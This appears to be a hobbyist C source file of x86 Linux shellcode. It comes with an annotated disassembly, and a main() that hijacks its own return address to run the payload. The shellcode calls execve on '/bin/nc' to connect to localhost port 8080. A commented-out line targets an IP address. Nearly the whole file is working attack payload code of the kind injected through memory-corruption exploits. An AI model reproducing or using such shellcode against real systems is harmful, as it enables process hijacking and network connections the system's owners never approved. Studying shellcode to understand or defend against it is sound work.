/*
08048060 <_start>:
 8048060:	eb 2a			jmp	804808c <GotoCall>	; go grab our string address

08048062 <shellcode>:
 8048062:	5e			pop	%esi			; grab the string address
 8048063:	31 c0			xor	%eax,%eax		; clear out eax
 8048065:	88 46 07		mov	%al,0x7(%esi)		; stick a null at the first '#'
 8048068:	88 46 15		mov	%al,0x15(%esi)		; stick a null at the second '#'
 804806b:	88 46 1a		mov	%al,0x1a(%esi)		; stick a null at the third '#'
 804806e:	89 76 1b		mov	%esi,0x1b(%esi)		; put address of first string after string array
 8048071:	8d 5e 08		lea	0x8(%esi),%ebx		; put address of second string in ebx
 8048074:	89 5e 1f		mov	%ebx,0x1f(%esi)		; put address of second string after address after string array
 8048077:	8d 5e 16		lea	0x16(%esi),%ebx		; put address of third string in ebx
 804807a:	89 5e 23		mov	%ebx,0x23(%esi)		; put address of third string after address after address after string array
 804807d:	89 46 27		mov	%eax,0x27(%esi)		; put a null after the address array
 8048080:	b0 0b			mov	$0xb,%al		; put 0x0b in eax (signal for execve?)
 8048082:	89 f3			mov	%esi,%ebx		; put the first string in ebx ('/bin/nc')
 8048084:	8d 4e 1b		lea	0x1b(%esi),%ecx		; put address array in ecx
 8048087:	8d 56 27		lea	0x27(%esi),%edx		; put null in edx
 804808a:	cd 80			int	$0x80

0804808c <GotoCall>:
 804808c:	e8 d1 ff ff ff		call	8048062 <shellcode>	; jump back to instructions, feeding %esi the address of our string
 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX	; blah blah blah, string goes here. see below
*/

// /bin/nc 192.168.1.101 8080

char shellcode[] =
	"\xeb\x2a"			// go grab our string address
	"\x5e"				// grab the string address
	"\x31\xc0"			// clear out eax

	"\x88\x46\x07"			// mov %al 0x07(%esi) : put a null at 7 bytes (first #)
	/* "\x88\x46\x15"		// mov %al 0x15(%esi) : put a null at 21 bytes (second #) */
	/* "\x88\x46\x1a"		// mov %al 0x1a(%esi) : put a null at 26 bytes (third #) */
	"\x88\x46\x11"			// mov %al 0x11(%esi) : put a null at 17 bytes (second #)
	"\x88\x46\x16"			// mov %al 0x16(%esi) : put a null at 22 bytes (third #)

	"\x89\x76\x1b"			// put the address of '/bin/nc' after the string array
	"\x8d\x5e\x08"			// grab the address of 'localhost'
	"\x89\x5e\x1f"			// add address of 'localhost' to address array
	/* "\x8d\x5e\x16"		// grab the address of '8080' */
	"\x8d\x5e\x12"			// grab the address of '8080'
	"\x89\x5e\x23"			// add address of '8080' to address array
	"\x89\x46\x27"			// stick a null at the end of address array
	"\xb0\x0b"			// set signal for execve (we think) in eax
	"\x89\xf3"			// put address of '/bin/nc' in ebx (the command name)
	"\x8d\x4e\x1b"			// put address of address array in ecx (the command line)
	"\x8d\x56\x27"			// put null in edx (the env array)
	"\xcd\x80"			// call system interrupt (woosh, we're off)
	"\xe8\xd1\xff\xff\xff"		// (string address landing) jump back to the second line, putting our absolute address on the stack

	// the string we're going to execute

	"\x2f\x62\x69\x6e\x2f\x6e\x63\x23"				// /bin/nc#
	/* "\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x31\x30\x31\x23"	// 192.168.1.101# */
	"\x6c\x6f\x63\x61\x6c\x68\x6f\x73\x74\x23"			// localhost#
	"\x38\x30\x38\x30\x23";						// 8080#

int main()
{
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int)shellcode;
}

// vim: noet ts=8 sw=8 sts=8
